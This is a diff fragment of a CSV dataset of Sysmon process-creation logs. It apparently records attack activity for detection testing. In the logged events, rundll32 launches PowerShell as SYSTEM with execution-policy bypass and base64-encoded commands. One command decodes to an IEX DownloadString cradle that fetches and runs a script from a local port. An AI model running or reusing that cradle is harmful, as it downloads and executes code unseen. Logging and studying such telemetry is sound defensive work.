+    <Execution ProcessID=""1472"" ThreadID=""2036""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-02.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:34:02.560</Data>
+    <Data Name=""ProcessGuid"">{BEDB1A18-9ADA-62ED-0000-00102793F401}</Data>
+    <Data Name=""ProcessId"">4160</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{BEDB1A18-9A83-62ED-0000-0020A3AEEB01}</Data>
+    <Data Name=""LogonId"">0x0000000001ebaea3</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{BEDB1A18-9A4A-62ED-0000-0010B685E701}</Data>
+    <Data Name=""ParentProcessId"">4776</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",4160,4776,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
+2022-08-05 22:48:46+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
+  <System>
+    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime=""2022-08-05T22:48:46.397721700Z""/>
+    <EventRecordID>182109</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID=""1444"" ThreadID=""1932""/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>ACC-07.corp.net</Computer>
+    <Security UserID=""S-1-5-18""/>
+  </System>
+  <EventData>
+    <Data Name=""RuleName""/>
+    <Data Name=""UtcTime"">2022-08-05 22:48:46.397</Data>
+    <Data Name=""ProcessGuid"">{7A60D74F-9E4E-62ED-0000-00103738E801}</Data>
+    <Data Name=""ProcessId"">5148</Data>
+    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
+    <Data Name=""Description"">Windows PowerShell</Data>
+    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
+    <Data Name=""Company"">Microsoft Corporation</Data>
+    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADkAOAA4ADYALwAnACkAOwAgAEcAZQB0AC0AWQAzAEoANQBjAEgAUgB5AA==</Data>
+    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
+    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
+    <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>
+    <Data Name=""LogonId"">0x0000000001b0d97b</Data>
+    <Data Name=""TerminalSessionId"">0</Data>
+    <Data Name=""IntegrityLevel"">System</Data>
+    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
+    <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
+    <Data Name=""ParentProcessId"">3208</Data>
+    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
+    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
+  </EventData>
+</Event>
+",5148,3208,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADkAOAA4ADYALwAnACkAOwAgAEcAZQB0AC0AWQAzAEoANQBjAEgAUgB5AA==,NT AUTHORITY\SYSTEM,,
